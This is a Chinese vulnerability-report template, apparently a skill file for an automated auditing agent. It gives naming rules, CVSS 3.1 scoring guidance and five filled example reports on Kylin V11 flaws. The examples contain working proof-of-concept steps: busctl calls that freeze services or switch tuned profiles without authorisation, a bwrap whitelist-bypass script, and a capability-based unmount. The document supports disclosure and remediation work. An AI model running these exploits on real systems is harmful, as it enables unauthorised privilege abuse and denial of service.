# 漏洞报告模板

## 首句规则

漏洞描述的第一句用陈述句：`<组件> 存在 <漏洞类型> 漏洞` —— 先给结论，再展开（**不加粗**）。
**不得举例**：本 skill 内不出现具体组件名 / 具体漏洞类型（含示例与骨架常量）。
`## 漏洞标题` 与「对外脱敏描述」同样以该结论句式开头。

---

## 漏洞标题命名规则

**单个方法**：使用 `{接口名}.{方法名}`
```
org.ukui.UniauthBackend.GetLastLoginUser 方法存在未授权访问漏洞
```

**单个二进制**：使用 `{组件名} {二进制名}`
```
libbox1 组件 boxumount 存在弱路径校验任意卸载漏洞
```

**多个方法/二进制**：使用 `{服务名/组件名}`
```
org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞，影响所有受保护接口
```

---

## 报告模板

> 章节序（9 节）：漏洞标题 → 目标与漏洞信息 → 漏洞描述 → 漏洞原理 → 利用条件与危害 → 验证情况(六阶段) → PoC 验证 → 修复建议 → 进一步分析建议。
> **篇幅上限**：正文 ≤ 70 行（不含 PoC 原始输出）；表格 ≤ 3 个；CVSS 只写"向量 + 一行依据"，不逐维度成段（细则见「CVSS 3.1 严格评分指南」）。
> **编号与分道**：越权漏洞与信息暴露/配置类缺陷**统一 `vuln-NNN` 编号**，仅以「危害等级」字段区分（不单设编号前缀）。信息暴露类（CWE-200/732）走精简章节——可省「漏洞原理」深挖，但须填「权限影响」= 同权限域（不可越权），并交叉引用所使能的漏洞。

```markdown
# vuln-00N

## 漏洞标题

<组件名/接口名.方法名> 存在<漏洞类型>漏洞

## 目标与漏洞信息

| 项目 | 值 |
|------|-----|
| 受影响组件 | {组件名 + 版本} |
| 受影响路径 | {二进制 / 配置 / 接口}（md5） |
| 汇点 | {函数 @地址，源文件:行} |
| 入口 | {D-Bus 方法 / 二进制参数 / 信号 …} |
| 运行身份 | {uid / 权限位 / 能力} |
| 归属校验 | {`dpkg -S` / `rpm -qf` 结果，或框架 info 清单佐证} |
| 危害等级 | {严重(9.0+) / 高危(7.0-8.9) / 中危(4.0-6.9) / 低危(0.1-3.9)} |
| CWE | {CWE-编号 中文名称} |
| CVSS 3.1 | `CVSS:3.1/AV:{X}/AC:{X}/PR:{X}/UI:{X}/S:{X}/C:{X}/I:{X}/A:{X}` = {0.0-10.0} |
| 权限影响 | {跨权限域（可越权） / 同权限域（不可越权）}（扩展模式必填） |

## 漏洞描述

<组件> 存在 <漏洞类型> 漏洞，漏洞源于 <函数/接口/配置> 的 <具体问题>；
<攻击者身份> 可经 <攻击向量> <利用方式>，导致 <危害>。

**对外脱敏描述**：{1–2 句标准漏洞语言；不出现内部函数名 / 字段偏移 / 私有接口名。}

**CVSS 依据**（一行）：AV:{X} {理由} · AC:{X} {理由} · PR:{X} {理由} · UI:{X} {理由} · S:{X} {理由} · C/I/A:{X}{X}{X} {理由}
（细则见本文件「CVSS 3.1 严格评分指南」，正文不逐维度展开。）

## 漏洞原理

{根因分析 + 关键代码/配置片段 + 调用链：sink ← 引用形式 ← 宿主函数 ← … ← 攻击者入口}

## 利用条件与危害

- **可能性**：{触发难度 / 是否需交互 / 是否需非默认配置 / 可重复性与稳定性}
- **前提条件**：{逐条一行，`条件 ✅/❌ — 依据`}
- **实际危害**：{逐条一行，`行为 → 能力/工具 → ✅已验证 / ❌未验证`}

## 验证情况

> 六阶段；每阶段 ≤3 行：`命令` → 关键回显 → 结论（系统级证据，不依赖接口返回值）。

### 阶段 1 Presence（目标存在性）
### 阶段 2 Introspection（特性检查）
### 阶段 3 Reachability（可达性）
### 阶段 4 Boundary（权限边界）
### 阶段 5 Impact（边界突破）
### 阶段 6 Cleanup（清理验证）

## PoC 验证

{`vuln-00N/poc.py` 末行三态结论（`漏洞存在` / `漏洞不存在` / `poc 执行失败，请调整环境或改用其他方式验证`）+ 1 条关键系统级证据；原始输出不入正文}

## 修复建议

1. {具体可操作的修复措施 1}
2. {具体可操作的修复措施 2}

## 进一步分析建议

- {同类 sink 排查 / 其他门控或触发路径 / 线上复验建议 …}
```

> **字段映射（旧版 → 新版）**：`漏洞信息` → `目标与漏洞信息`（等级/CWE/CVSS/权限影响同表）；`漏洞概述（内部）` → `漏洞描述`；`漏洞概述（外部）` → `漏洞描述 · 对外脱敏描述`；`漏洞原因` → `漏洞原理`；`漏洞利用的可能性` + `漏洞触发的前提条件` + `实际危害分析` → `利用条件与危害`；`复现步骤 / POC 脚本` → `验证情况` + `PoC 验证`。下方「填写示例 1–5」为**旧版示例**（字段较旧、篇幅较长），仅作对照，**勿照搬其结构**。

---

## CVSS 3.1 严格评分指南

### 评分前必答四问

在填写 CVSS 向量之前，必须逐项回答：

1. **攻击向量 (AV)**：漏洞利用需要本地访问 (L) 还是可通过网络 (N)？黑盒漏洞挖掘几乎都是本地 → **默认 AV:L**，除非明确可通过网络触发。

2. **攻击复杂度 (AC)**：是否需要条件竞争、内存布局、特定配置等非平凡条件？→ 默认 AC:L。仅当存在额外前提条件（如竞争窗口极窄、需要特定非默认配置）时才是 AC:H。

3. **权限要求 (PR)**：攻击前是否需要系统账号？普通用户 → PR:L，无账号 → PR:N，root → PR:H。

4. **机密性/完整性/可用性 (C/I/A)**：**能用系统级命令实际验证出什么影响？** 这是最容易被虚高的维度。
   - 只能读 → C 有值，I/A 无
   - 只能写特定文件 → I 按实际范围取 L 或 H
   - 只能让服务挂掉 → A 有值，C/I 无
   - 关闭安全机制本身 ≠ C:H，后续利用才是

### 常见评分错误

| 错误 | 错误评分 | 正确评分 | 原因 |
|------|---------|---------|------|
| 关闭 SELinux → 全满分 | C:H/I:H/A:H | C:N/I:L/A:H (6.1) | 关闭机制本身不泄露数据，不直接写文件 |
| 仅读 /etc/shadow → 全满分 | C:H/I:H/A:H | C:H/I:N/A:N (5.5) | 无写能力，无可用性影响 |
| DoS 冻结服务 → 全满分 | C:H/I:H/A:H | C:N/I:N/A:H (5.5) | 纯拒绝服务 |
| 需要特殊配置才触发 | AC:L | AC:H | 降低一档 |
| 仅推测危害未验证 | 随意填 | 取低档 | 无法确定就取低 |

### 场景速查

| 场景 | CVSS 向量 | 分数 | 为什么不是更高 |
|------|----------|------|---------------|
| SUID 命令注入 → root | AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 7.8 | 本地提权，S:U 上限即 7.8 |
| 任意文件写 → 提权 | AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 7.8 | 同上 |
| 任意文件读 | AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 5.5 | 只读不写，无 I/A 影响 |
| 关闭安全机制 | AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H | 6.1 | 无 C，I 低（仅改配置），A 高 |
| 删除审计日志 | AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L | 3.3 | 仅 audit 日志可恢复性受损 |
| 解绑认证设备 | AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N | 4.4 | 不影响系统可用性 |
| 未授权 DoS | AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H | 5.5 | 纯 DoS |
| 信息泄露（非敏感） | AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N | 2.3 | 低影响 |
| 不可信文件 → 用户级命令执行（同权限域） | AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N | 6.6 | 以登录用户权限执行、不可越权；需受害者处理恶意文件/触发操作 |
| 同域接口篡改用户数据（攻击者=同机受限进程） | AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N | 5.5 | 不越权，影响限于该用户的数据完整性 |
| PolicyKit modify.system=yes | 按实际危害逐项填 C/I/A | — | 必须先做步骤 0 基线 |

### 危害判定对照

判定 C/I/A 时，将接口能做的操作对照此表确定影响级别：

| 操作范围 | 具体能力 | 对应 C/I/A |
|---------|---------|-----------|
| 用户管理 | 增删用户、改密码、改 UID/GID | I:H |
| 包管理 | 安装/卸载软件包 | I:H |
| 进程控制 | 启停服务、kill 进程、改优先级 | A:H |
| 网络配置 | 改 IP/路由/DNS/防火墙 | I:H, A:H |
| 存储 | 挂载/卸载/格式化磁盘 | I:H, A:H |
| 内核 | 加载模块、改 sysctl、重启 | I:H, A:H |
| 安全策略 | 改 SELinux、关防火墙、清审计日志 | I:L, A:H |
| 文件读写 | 读敏感文件（shadow/ssh key）| C:H |
| 文件读写 | 写系统文件（passwd/sudoers/cron）| I:H |
| 信息查询 | 读配置文件、进程信息、系统状态 | C:L（非敏感）或 C:H（含密钥/凭证） |

**用法**：接口能做的事命中上表某行 → 对应的 C/I/A 直接取该行的值。命中多行 → 取最高。

### 硬性规则

1. **每个维度必须写依据**：在报告的"CVSS 评分依据"节中，每个维度用一句话解释为什么取该值
2. **评分前必须执行步骤 0**：确认该操作默认需要 root，否则不构成漏洞
3. **C/I/A 必须系统级验证**：不依赖命令返回值，用 md5sum / mount / systemctl status 等独立命令确认
4. **无法确定 → 取低档**：如果某维度只能推测而无法实际验证，取更低一档
5. **危害等级与分数对应**：严重(9.0+) / 高危(7.0-8.9) / 中危(4.0-6.9) / 低危(0.1-3.9)
6. **同权限域漏洞**（扩展模式产出）：照常逐项评分，但必须显式标注"不可越权"并填写「权限影响」字段；C/I/A 按受害用户可达范围取值，S 恒为 U，PR 按攻击者所需立足点取（如诱骗用户处理文件取 `PR:L`、同域受限进程取 `PR:L`、无立足点仅靠不可信输入取 `PR:N`）
7. **Scope 默认 S:U**：同一操作系统内的本地提权/越权**一律 S:U**（攻击者与受害组件同属一个安全权威）。仅当影响跨越**不同安全权威**（容器/VM↔宿主、浏览器↔站点、跨主机）才取 S:C。反例：`S:C/C:L/I:H/A:L`=7.9 应为 `S:U`=6.6。
8. **分数必须用脚本复核**：向量定稿后用 `references/cvss31_calc.py` 计算并粘贴分数，禁止手算（手算易错，如 `AV:L` 实为 0.55 而非 0.395；常见误判 `C:N/I:H/A:H` 为 6.5，实为 7.1）。

---

## 填写示例

### 示例 1：D-Bus 未授权冻结服务

```markdown
# vuln-001

## 漏洞标题

com.kylin.ProcessManagerDaemon.SetSystemdUnitFreezelimit 方法存在未授权访问漏洞

## 漏洞信息

| 字段 | 内容 |
|------|------|
| 漏洞编号 | vuln-001 |
| 危害等级 | 中危 |
| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H |
| 评分 (CVSS 3.1) | 6.1 |
| 挖掘人员 | {姓名} |
| CWE ID | CWE-862 |
| CWE 名称 | 缺失授权 |

### CVSS 评分依据

- **AV:L**：需要本地 shell 访问
- **AC:L**：单条 busctl 命令即可，无特殊条件
- **PR:L**：普通用户即可
- **UI:N**：无需用户交互
- **S:U**：影响范围不超出当前安全域
- **C:N**：冻结服务不直接泄露数据
- **I:L**：可修改服务状态（冻结/解冻），但无法写入任意文件
- **A:H**：冻结关键服务（auditd、cron 等）可导致系统功能严重受损

## 漏洞概述（内部）

com.kylin.ProcessManagerDaemon 服务的 SetSystemdUnitFreezelimit 方法存在未授权访问漏洞，
漏洞源于该 D-Bus 方法未实施有效的调用者身份认证。任意本地普通用户可通过 D-Bus 直接调用该方法，
冻结或解冻任意 systemd 服务。攻击者可利用此漏洞冻结关键安全服务（KYSEC、auditd、firewalld）
使安全防护失效，或冻结基础服务（cron、NetworkManager）造成拒绝服务。

## 漏洞概述（外部）

com.kylin.ProcessManagerDaemon 服务存在未授权访问漏洞。本地攻击者可通过 D-Bus 接口
冻结任意系统服务，导致安全防护机制失效或系统拒绝服务。

## 漏洞原因

SetSystemdUnitFreezelimit 方法未集成 Polkit 认证检查，且 D-Bus XML Policy 未限制调用者身份。
任何可连接 system bus 的本地用户均可调用该方法。

## 复现步骤 / POC 脚本

### 测试环境

- 目标系统：Kylin V11
- 测试方式：Agent on Target
- 测试用户：普通用户（无 sudo 权限）

### POC

\```bash
# 步骤 0：权限基线 — 确认普通用户不能直接操作 systemd 服务
systemctl freeze cron.service 2>&1
# Interactive authentication required. → 需要 root

# 步骤 1：查看 D-Bus 接口
busctl introspect com.kylin.ProcessManagerDaemon /com/kylin/ProcessManagerDaemon

# 步骤 2：普通用户调用冻结 cron 服务
busctl --system call com.kylin.ProcessManagerDaemon \
  /com/kylin/ProcessManagerDaemon \
  com.kylin.ProcessManagerDaemon \
  SetSystemdUnitFreezelimit "sb" "cron.service" true

# 步骤 3：系统级验证
systemctl status cron.service
# Active: active (frozen) since ...  ← 确认已冻结

# 步骤 4：恢复
busctl --system call com.kylin.ProcessManagerDaemon \
  /com/kylin/ProcessManagerDaemon \
  com.kylin.ProcessManagerDaemon \
  SetSystemdUnitFreezelimit "sb" "cron.service" false
\```

## 修复建议

1. 添加 Polkit 认证：为该方法关联 Polkit action，要求 auth_admin 权限
2. D-Bus XML Policy 限制：在 /etc/dbus-1/system.d/ 中仅允许 root 调用
```

### 示例 2：D-Bus + PolicyKit 未授权

```markdown
# vuln-002

## 漏洞标题

com.redhat.tuned.switch_profile 方法存在未授权 profile 切换漏洞

## 漏洞信息

| 字段 | 内容 |
|------|------|
| 漏洞编号 | vuln-002 |
| 危害等级 | 高危 |
| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H |
| 评分 (CVSS 3.1) | 7.1 |
| 挖掘人员 | {姓名} |
| CWE ID | CWE-268 |
| CWE 名称 | 权限配置不当 |

### CVSS 评分依据

- **AV:L**：需要本地 shell 访问
- **AC:L**：单条 busctl 命令，无特殊条件
- **PR:L**：普通用户即可
- **UI:N**：无需用户交互
- **S:U**：仅影响本系统
- **C:N**：切换 profile 不泄露数据
- **I:H**：可将系统性能策略改为任意 profile，严重影响系统运行状态
- **A:H**：切换到不适用的 profile（如省电模式）可导致服务中断

## 漏洞概述（内部）

tuned 组件的 switch_profile D-Bus 方法存在权限配置不当漏洞，漏洞源于其对应的 Polkit action
com.redhat.tuned.switch_profile 在活跃会话维度配置为 allow_active=yes。本地活跃会话用户
无需提供管理员密码即可通过 D-Bus 调用该方法，将系统性能调优策略切换到任意指定 profile。
攻击者可精准选择目标 profile（如将服务器从虚拟化优化 profile 切换到省电 profile），
直接导致系统性能严重下降。

## 漏洞概述（外部）

tuned 组件存在权限配置不当漏洞。本地攻击者可在无需认证的情况下切换系统性能调优策略，
导致系统性能严重下降或服务中断。

## 漏洞原因

com.redhat.tuned.switch_profile 的 Polkit 策略配置 allow_active=yes，允许活跃会话用户
无需管理员密码即可调用。该操作为系统级配置变更（modify.system），应配置为 auth_admin。

## 复现步骤 / POC 脚本

### 测试环境

- 目标系统：Kylin V11
- 测试方式：Agent on Target
- 测试用户：普通用户（无 sudo 权限）

### POC

\```bash
# 步骤 0：权限基线 — 确认默认需要认证
pkaction --action-id com.redhat.tuned.switch_profile --verbose | grep implicit
# implicit active: yes  ← 未授权，是漏洞

# 步骤 1：查看当前 profile
busctl call com.redhat.tuned /Tuned com.redhat.tuned.control active_profile

# 步骤 2：普通用户尝试切换
busctl call com.redhat.tuned /Tuned com.redhat.tuned.control switch_profile s "powersave"

# 步骤 3：系统级验证
tuned-adm active
# Current active profile: powersave  ← 确认切换成功

# 步骤 4：恢复
busctl call com.redhat.tuned /Tuned com.redhat.tuned.control switch_profile s "balanced"
\```

## 修复建议

1. 修改 switch_profile 策略：将 `<allow_active>` 从 `yes` 修改为 `auth_admin`
2. 统一安全级别：auto_profile 与 switch_profile 共享后端实现，两者的安全级别应保持一致
```

### 示例 3：D-Bus bwrap 白名单绕过

```markdown
# vuln-003

## 漏洞标题

org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞

## 漏洞信息

| 字段 | 内容 |
|------|------|
| 漏洞编号 | vuln-003 |
| 危害等级 | 高危 |
| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| 评分 (CVSS 3.1) | 7.8 |
| 挖掘人员 | {姓名} |
| CWE ID | CWE-287 |
| CWE 名称 | 认证绕过 |

### CVSS 评分依据

- **AV:L**：需要本地 shell 访问
- **AC:L**：bwrap 为系统自带工具，利用无额外条件
- **PR:L**：普通用户即可
- **UI:N**：无需用户交互
- **S:U**：仅影响本系统
- **C:H**：可获取登录用户、RSA 公钥、认证配置等敏感信息（影响 30+ 个方法）
- **I:H**：可修改认证配置、设置快速登录用户
- **A:N**：无直接可用性影响

## 漏洞概述（内部）

org.ukui.UniauthBackend D-Bus 服务存在白名单绕过漏洞，影响所有受保护接口（共 30+ 个方法）。
漏洞源于该服务的访问控制基于 /proc/PID/cmdline 的 argv[0] 字符串匹配，攻击者可通过
bubblewrap 将任意二进制（如 python3）映射到白名单路径，绕过双重安全检查
（limit control + ensureTrustedCaller），以白名单进程身份调用所有受保护方法。

## 漏洞概述（外部）

org.ukui.UniauthBackend D-Bus 服务存在认证绕过漏洞。本地攻击者可通过 bubblewrap
绕过进程白名单检查，调用受保护的 D-Bus 方法获取敏感信息或修改认证配置。

## 漏洞原因

ensureTrustedCaller 方法通过读取 /proc/PID/cmdline 的 argv[0] 与白名单比对来验证调用者身份。
但 /proc/PID/cmdline 反映的是进程启动时的 argv[0]，可被 bubblewrap 的 --bind 功能伪造。
应改用 /proc/PID/exe 读取真实二进制路径。

## 复现步骤 / POC 脚本

### 测试环境

- 目标系统：Kylin V11
- 测试方式：Agent on Target
- 测试用户：普通用户

### POC

\```python
#!/usr/bin/env python3
import subprocess
import os
import tempfile

WHITELIST_EXE = "/usr/bin/bioauth"
PYTHON3 = "/usr/bin/python3"

EVIL_SCRIPT = '''
import dbus
bus = dbus.SystemBus()
proxy = bus.get_object("org.ukui.UniauthBackend", "/org/ukui/UniauthBackend")
iface = dbus.Interface(proxy, "org.ukui.UniauthBackend")
print(f"[+] GetLastLoginUser: {iface.GetLastLoginUser()}")
print(f"[+] getMaxFailedTimes: {iface.getMaxFailedTimes()}")
'''

with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
    f.write(EVIL_SCRIPT)
    script_path = f.name

try:
    subprocess.run([
        "bwrap", "--ro-bind", "/", "/",
        "--bind", "/run", "/run", "--clearenv",
        "--bind", PYTHON3, WHITELIST_EXE,
        "--", WHITELIST_EXE, script_path
    ])
finally:
    os.unlink(script_path)
\```

## 修复建议

1. 改用 /proc/PID/exe 读取真实二进制路径，而非 argv[0]
2. 增加二进制哈希校验，防止伪造
3. 使用 AppArmor/SELinux 限制 D-Bus 调用者
```

### 示例 4：SUID 提权

```markdown
# vuln-004

## 漏洞标题

{组件名} {二进制名} 存在 SUID 命令注入提权漏洞

## 漏洞信息

| 字段 | 内容 |
|------|------|
| 漏洞编号 | vuln-004 |
| 危害等级 | 高危 |
| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| 评分 (CVSS 3.1) | 7.8 |
| 挖掘人员 | {姓名} |
| CWE ID | CWE-78 |
| CWE 名称 | OS 命令注入 |

### CVSS 评分依据

- **AV:L**：需要本地 shell 访问
- **AC:L**：无需特殊条件即可触发
- **PR:L**：普通用户即可
- **UI:N**：无需用户交互
- **S:U**：仅影响当前安全域
- **C:H**：可读取任意文件（/etc/shadow 等）
- **I:H**：可写入任意文件（/etc/passwd 等）
- **A:H**：可执行任意命令，完全影响系统可用性

## 漏洞概述（内部）

{组件名} 的 {二进制名} 存在 SUID 命令注入提权漏洞，漏洞源于该二进制设置了 SUID root 权限
且 {具体函数} 未对用户输入的 {参数} 做充分校验。攻击者可通过构造恶意参数注入系统命令，
以 root 权限执行任意操作，实现从普通用户到 root 的本地提权。

## 漏洞概述（外部）

{组件名} 存在本地提权漏洞。该组件中的 SUID 程序未正确校验用户输入，
本地攻击者可利用此漏洞以 root 权限执行任意命令。

## 漏洞原因

{二进制名} 设置了 SUID root 位，其 {具体函数} 在处理用户输入时将 {参数} 直接传递给
system()/popen()/exec() 等函数而未做过滤。SUID 程序以文件属主（root）权限运行，
导致注入的命令同样以 root 权限执行。

关键代码路径：
- {二进制路径} (SUID root, owner: root)
- 调用链：main → {函数A} → {函数B} → system({用户输入})

## 复现步骤 / POC 脚本

### 测试环境

- 目标系统：Kylin V11
- 测试方式：本地测试
- 测试用户：普通用户

### POC

\```bash
# 步骤 0：权限基线
id  # uid=1000(cl)，确认非 root
whoami  # cl
cat /etc/shadow 2>&1 | head -1  # Permission denied → 确认需要 root

# 步骤 1：功能识别
file /usr/bin/<binary>
# ELF 64-bit, SUID, ...
strings /usr/bin/<binary> | grep -iE 'exec|system|popen|/bin/sh'

# 步骤 2：可达性 — 以普通用户身份执行
id  # 确认 uid=1000(cl)
/usr/bin/<binary> "<payload>"

# 步骤 3：系统级验证
id  # 对比步骤 0：输出显示 uid=0(root) → 提权成功
md5sum /etc/shadow  # 确认文件内容与利用输出一致

# 步骤 4：权限对比
# 普通用户通过 SUID 程序获得了 root 级命令执行能力
\```

## 修复建议

1. 移除不必要的 SUID 位：`chmod u-s /usr/bin/<binary>`
2. 改用 execve() 替代 system()，避免 shell 解析
3. 对用户输入参数做严格白名单校验
4. 如确实需要特权操作，使用 capabilities 替代 SUID，只授予最小能力
```

### 示例 5：文件能力漏洞

```markdown
# vuln-005

## 漏洞标题

libbox1 组件 boxumount 存在弱路径校验任意卸载漏洞

## 漏洞信息

| 字段 | 内容 |
|------|------|
| 漏洞编号 | vuln-005 |
| 危害等级 | 高危 |
| 攻击向量 (CVSS 3.1) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H |
| 评分 (CVSS 3.1) | 7.1 |
| 挖掘人员 | {姓名} |
| CWE ID | CWE-269 |
| CWE 名称 | 权限配置不当 |

### CVSS 评分依据

- **AV:L**：需要本地 shell 访问
- **AC:L**：直接执行二进制即可，无额外条件
- **PR:L**：普通用户即可
- **UI:N**：无需用户交互
- **S:U**：仅影响本系统
- **C:N**：卸载操作不泄露数据
- **I:H**：可卸载任意挂载点（包括系统关键挂载点）
- **A:H**：卸载关键挂载点可导致系统崩溃或数据不可用

## 漏洞概述（内部）

libbox1 组件 boxumount 存在弱路径校验任意卸载漏洞，漏洞源于该二进制具有
cap_chown、cap_dac_override、cap_dac_read_search、cap_fowner、cap_sys_admin
五种高危能力，且未对卸载目标路径做严格校验。普通用户可通过该二进制绕过权限检查，
卸载任意挂载点，导致系统不稳定或拒绝服务。

## 漏洞概述（外部）

libbox1 组件存在权限配置不当漏洞。该组件中的 boxumount 程序被授予了过高权限，
本地攻击者可通过该程序卸载任意挂载点，导致系统拒绝服务。

## 漏洞原因

boxumount 被授予了 cap_sys_admin 等五种高危能力（cap_chown,cap_dac_override,
cap_dac_read_search,cap_fowner,cap_sys_admin=ep），这些能力允许二进制绕过文件权限检查
并执行挂载管理操作。同时 boxumount 未对用户传入的挂载点路径做白名单校验，
导致普通用户可以卸载任意挂载点。

## 复现步骤 / POC 脚本

### 测试环境

- 目标系统：Kylin V11
- 测试方式：本地测试
- 测试用户：普通用户

### POC

\```bash
# 步骤 0：权限基线
id  # uid=1000(cl)，确认非 root
mount | grep /data  # /dev/sdb1 on /data ... 挂载点存在
umount /data 2>&1  # umount: only root can do that → 确认需要 root

# 步骤 1：能力识别
getcap /usr/bin/boxumount
# /usr/bin/boxumount cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_admin=ep

# 步骤 2：可达性 — 普通用户执行
id  # 确认 uid=1000(cl)
boxumount /data

# 步骤 3：系统级验证
mount | grep /data  # 预期空 → /data 已卸载
ls /data  # 目录为空

# 步骤 4：权限对比
# 普通用户通过 capabilities 绕过了权限检查，成功卸载了需要 root 的挂载点
\```

## 修复建议

1. 移除不必要的 capabilities：boxumount 不需要 cap_chown、cap_fowner 等能力，仅保留所需的最小能力集
2. 添加严格的路径白名单校验：只允许卸载预设的挂载点
3. 使用 sudo 配合特定命令替代 capabilities，实现更细粒度的权限控制
```
